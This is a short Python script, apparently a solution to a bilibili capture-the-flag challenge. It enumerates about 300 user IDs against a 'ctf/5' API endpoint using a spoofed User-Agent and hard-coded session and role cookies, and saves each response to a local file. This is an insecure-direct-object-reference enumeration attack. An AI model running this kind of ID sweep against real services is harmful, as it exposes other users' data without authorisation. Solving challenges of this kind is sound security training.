import requests
import urllib
import json
#uid输入
i = []
for a in range(100336889,100337189):
    i.append(a)
for b in i:
    uid = str(b)
    url = "http://45.113.201.36/api/ctf/5?uid=" + uid
    print(url)
    headers = {'User-Agent': 'bilibili Security Browser'}
    cookie = {
    "role":"7b7bc2512ee1fedcd76bdc68926d4f7b",
    "session":"eyJ1aWQiOiI4MjM0NzUzNCJ9.X5RGpw.X1YEnN8cr8U5RquQVsfZ2zbohu0"
    }
    res = requests.get(url=url,headers=headers,cookies=cookie)
    print(res)
    json_data=json.loads(res.text)
    with open('D:/python-workspace/data.json'.format(i), 'a+') as json_file:
        json_file.write(res.text)
